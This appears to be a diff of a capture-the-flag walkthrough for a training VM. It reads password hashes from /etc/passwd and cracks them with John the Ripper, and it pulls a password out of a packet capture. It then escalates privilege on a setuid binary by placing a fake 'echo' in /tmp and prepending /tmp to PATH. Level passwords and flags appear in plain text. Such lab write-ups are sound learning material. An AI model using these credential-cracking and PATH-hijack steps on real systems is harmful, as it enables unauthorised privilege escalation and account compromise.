@@ -7,6 +7,8 @@ level02  f2av5il02puano7naaf6adaaf
 
 flag02  ft_waNDReL0L
 level03  kooda2puivaav1idi4f57q8iq
+
+level04  qi0maab88jeaj46qoumi7maus
 ```
 
 
@@ -57,33 +59,33 @@ Password: nottoohardhere
 
 # 01
 
-- take a look at legacy folder `/etc/passwd`
+- Legacy folder `/etc/passwd`
 
 ```b
-$ cat /etc/passwd
-$ cat /etc/passwd | grep -i flag01 | awk -F: '{print $2}'
+> cat /etc/passwd
+> cat /etc/passwd | grep -i flag01 | awk -F: '{print $2}'
 
-
-😀 if we have john we'll able to do:
-$ john --show <(cat /etc/passwd | grep -i flag01 | awk -F: '{print $2}')
+### observation
+  😀 if we have john we'll able to do:
+  > john --show <(cat /etc/passwd | grep -i flag01 | awk -F: '{print $2}')
 ```
 
-- use our own _`do_john`_ script
+- Use our own _`do_john`_ script
 
 ```b
-$ chmod +x do_john.sh
-$ ./do_john.sh
+> chmod +x do_john.sh
+> ./do_john.sh
 ```
 
 - or download and use _`john`_
 
 ```b
-$ wget https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_sse4.zip
-$ tar -xvf john-1.8.0.9-jumbo-macosx_sse4.zip
-$ cd john-1.8.0.9-jumbo-macosx_sse4
-$ echo 42hDRfypTqqnw > __test
-$ ./john __test
-$ ./john --show __test
+> wget https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_sse4.zip
+> tar -xvf john-1.8.0.9-jumbo-macosx_sse4.zip
+> cd john-1.8.0.9-jumbo-macosx_sse4
+> echo 42hDRfypTqqnw > __test
+> ./john __test
+> ./john --show __test
 ```
 
 # 01 - token
@@ -98,12 +100,12 @@ Password: abcdefg
 
 # 02
 
-- new stuff
+- New stuff
   - `realpath` - get the full absolute filepath
   - `scp` - secure copy - `scp username@ip:path _local_`
   - `~.pcap` - a Packet Capture to store network packet data captured during network traffic monitoring
 
-- save the `.pcap` to Host
+- Save the `.pcap` to Host
 ```b
 ### VM
 > ls -l
@@ -113,7 +115,7 @@ Password: abcdefg
 > scp -P 4242 level02@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'):/home/user/level02/level02.pcap $(pwd)
 ```
 
-- ❌ inspect the `.pcap`  
+- ❌ Inspect `.pcap`  
 
 ```b
 ### Host
@@ -123,7 +125,7 @@ Password: abcdefg
 > xxd level02.pcap | cut -d ' ' -f2-9 | tr -d ' '
 ```
 
-- ✅ use _Wireshark_ 
+- ✅ Use _Wireshark_ 
   - _Analyze - Follow - TCP Stream_ 
   - copy _`TCP Stream`_ to text
 
@@ -179,5 +181,58 @@ print('res/', res)
 Password: ft_waNDReL0L
 > su level03
 > Password: kooda2puivaav1idi4f57q8iq
+```
+
+
+# 03
+
+- Inspect
+  - ❌ `file` `readelf` `strings` 
+  - ✅ `ltrace` 
+```b
+> ls -l
+-rwsr-sr-x 1 flag03 level03 8627 level03
+   ^  ^ setuid bit & setgid bit are set
+  👉 when the binary is exec functions called inside it
+  are called under same level of permission
+```
+```b
+> ltrace ./level03
+  👉 we can see the `s` bit in action
+
+### output
+getegid()                                           = 2003
+geteuid()                                           = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+system("/usr/bin/env echo Exploit me" ...
+
+### observations
+  👉 getegid & geteuid return a effective group/user ID ie. 2003
+  👉 setresgid & setresuid set Real/Effective/Saved ID to ensure
+  that the process maintains privileges
+  👉 `/usr/bin/env echo` uses a vulnerable relative path
+  since ./level03 has high privileges,
+  we can fake a false echo to run getflag inside ./level03
+```
+```b
+> whereis getflag
+getflag: /bin/getflag
+```
+
+- Solution
+
+```b
+> echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
+> chmod +x /tmp/echo
+> export PATH=/tmp:$PATH  👈 prepend tmp to get it checked first
+> ./level03
+```
+
+# 03 - token
+
+```b
+> su level04
+> Password: qi0maab88jeaj46qoumi7maus
 ```
 
